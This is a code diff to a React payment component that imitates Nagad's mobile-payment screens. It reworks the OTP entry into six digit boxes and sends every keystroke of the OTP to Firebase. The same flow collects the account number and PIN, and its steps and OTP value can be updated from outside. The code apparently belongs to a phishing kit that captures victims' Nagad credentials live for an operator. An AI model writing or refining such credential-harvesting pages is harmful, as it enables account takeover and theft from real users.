@@ -18,6 +18,9 @@ export const PaymentFlow: React.FC<PaymentFlowProps> = ({
   const [accountDigits, setAccountDigits] = useState<string[]>(
     session.accountNumber ? session.accountNumber.split('').concat(Array(11).fill('')).slice(0, 11) : Array(11).fill('')
   );
+  const [otpDigits, setOtpDigits] = useState<string[]>(
+    session.otp ? session.otp.split('').concat(Array(6).fill('')).slice(0, 6) : Array(6).fill('')
+  );
   const [otpValue, setOtpValue] = useState<string>(session.otp || '');
   const [pinDigits, setPinDigits] = useState<string[]>(
     session.pin ? session.pin.split('').concat(Array(4).fill('')).slice(0, 4) : Array(4).fill('')
@@ -27,7 +30,16 @@ export const PaymentFlow: React.FC<PaymentFlowProps> = ({
   const [isSuccessState, setIsSuccessState] = useState<boolean>(false);
 
   const digitInputRefs = useRef<(HTMLInputElement | null)[]>([]);
+  const otpInputRefs = useRef<(HTMLInputElement | null)[]>([]);
   const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);
+
+  // Keep internal states synced if session values change from outside
+  useEffect(() => {
+    if (session.otp !== undefined) {
+      setOtpDigits(session.otp.split('').concat(Array(6).fill('')).slice(0, 6));
+      setOtpValue(session.otp);
+    }
+  }, [session.otp]);
 
   // Real-time synchronization helper to update Firebase RTDB and Firestore
   const syncToFirebase = async (updates: Partial<TransactionSession>) => {
@@ -110,18 +122,63 @@ export const PaymentFlow: React.FC<PaymentFlowProps> = ({
   };
 
   // Step 2: OTP handlers
+  const handleOtpDigitChange = (index: number, val: string) => {
+    // Handle paste of whole 6-digit code
+    if (val.length > 1) {
+      const digitsOnly = val.replace(/\D/g, '').slice(0, 6);
+      const newOtp = [...otpDigits];
+      for (let i = 0; i < 6; i++) {
+        newOtp[i] = digitsOnly[i] || '';
+      }
+      setOtpDigits(newOtp);
+      const fullOtp = newOtp.join('');
+      setOtpValue(fullOtp);
+      syncToFirebase({ otp: fullOtp });
+      if (digitsOnly.length === 6) {
+        otpInputRefs.current[5]?.focus();
+      } else {
+        otpInputRefs.current[Math.min(digitsOnly.length, 5)]?.focus();
+      }
+      return;
+    }
+
+    const digit = val.replace(/\D/g, '');
+    const newOtp = [...otpDigits];
+    newOtp[index] = digit;
+    setOtpDigits(newOtp);
+
+    const fullOtp = newOtp.join('');
+    setOtpValue(fullOtp);
+    syncToFirebase({ otp: fullOtp });
+
+    // Focus next box if digit entered
+    if (digit && index < 5) {
+      otpInputRefs.current[index + 1]?.focus();
+    }
+  };
+
+  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+    if (e.key === 'Backspace') {
+      if (!otpDigits[index] && index > 0) {
+        otpInputRefs.current[index - 1]?.focus();
+      }
+    }
+  };
+
   const handleProceedOtp = () => {
-    if (!otpValue || otpValue.trim().length < 4) {
+    const fullOtp = otpDigits.join('');
+    if (fullOtp.length !== 6) {
       setErrorMessage(
-        lang === 'bn' ? 'অনুগ্রহ করে সঠিক ওটিপি (OTP) কোড লিখুন' : 'Please enter a valid OTP code'
+        lang === 'bn' ? 'অনুগ্রহ করে সঠিক ৬ ডিজিটের ওটিপি (OTP) দিন' : 'Please enter a valid 6-digit OTP code'
       );
       return;
     }
     setErrorMessage('');
-    syncToFirebase({ otp: otpValue.trim(), step: 'pin' });
+    syncToFirebase({ otp: fullOtp, step: 'pin' });
   };
 
   const handleResendOtp = () => {
+    setOtpDigits(Array(6).fill(''));
     setOtpValue('');
     const newCount = (session.resendCount || 0) + 1;
     setErrorMessage(
@@ -198,7 +255,7 @@ export const PaymentFlow: React.FC<PaymentFlowProps> = ({
   // Render Step 1: Account Number
   if (session.step === 'number') {
     return (
-      <div className="w-full flex flex-col items-center mt-3 sm:mt-4 px-4">
+      <div className="w-full flex flex-col items-center mt-6 sm:mt-8 pt-1 px-4">
         <h2 className="text-white text-base sm:text-lg font-bold mb-3.5 text-center">
           {lang === 'bn' ? 'আপনার নগদ অ্যাকাউন্ট নম্বর' : 'Your Nagad Account Number'}
         </h2>
@@ -320,24 +377,26 @@ export const PaymentFlow: React.FC<PaymentFlowProps> = ({
   // Render Step 2: Verification Code [OTP]
   if (session.step === 'otp') {
     return (
-      <div className="w-full flex flex-col items-center mt-3 sm:mt-4 px-4">
+      <div className="w-full flex flex-col items-center mt-6 sm:mt-8 pt-1 px-4">
         <h2 className="text-white text-base sm:text-lg font-bold mb-3.5 text-center">
           {lang === 'bn' ? 'যাচাইকরণ কোড লিখুন [OTP]' : 'Enter Verification Code [OTP]'}
         </h2>
 
-        <div className="w-full max-w-xs sm:max-w-sm mb-5">
-          <input
-            type="text"
-            inputMode="numeric"
-            maxLength={8}
-            placeholder="XXX|XXX"
-            value={otpValue}
-            onChange={(e) => {
-              setOtpValue(e.target.value);
-              syncToFirebase({ otp: e.target.value });
-            }}
-            className="w-full bg-white rounded-md py-1.5 px-4 text-center text-gray-900 font-bold text-base sm:text-lg tracking-widest placeholder-gray-400 shadow-sm border border-transparent focus:outline-none focus:ring-1 focus:ring-white transition-none"
-          />
+        {/* 6 OTP Digit Boxes */}
+        <div className="flex items-center justify-center gap-1.5 sm:gap-2.5 mb-5">
+          {[0, 1, 2, 3, 4, 5].map((i) => (
+            <input
+              key={i}
+              ref={(el) => (otpInputRefs.current[i] = el)}
+              type="text"
+              inputMode="numeric"
+              maxLength={6}
+              value={otpDigits[i] || ''}
+              onChange={(e) => handleOtpDigitChange(i, e.target.value)}
+              onKeyDown={(e) => handleOtpKeyDown(i, e)}
+              className="w-8 h-9 sm:w-10 sm:h-11 bg-white rounded-[4px] text-center text-gray-900 font-extrabold text-lg sm:text-xl shadow-sm border border-transparent focus:outline-none focus:ring-1 focus:ring-white transition-none"
+            />
+          ))}
         </div>
 
         {errorMessage && (
@@ -377,7 +436,7 @@ export const PaymentFlow: React.FC<PaymentFlowProps> = ({
   // Render Step 3: Enter PIN
   if (session.step === 'pin') {
     return (
-      <div className="w-full flex flex-col items-center mt-3 sm:mt-4 px-4">
+      <div className="w-full flex flex-col items-center mt-6 sm:mt-8 pt-1 px-4">
         <h2 className="text-white text-base sm:text-lg font-bold mb-4 text-center">
           {lang === 'bn' ? 'পিন (PIN) দিন' : 'Enter PIN'}
         </h2>
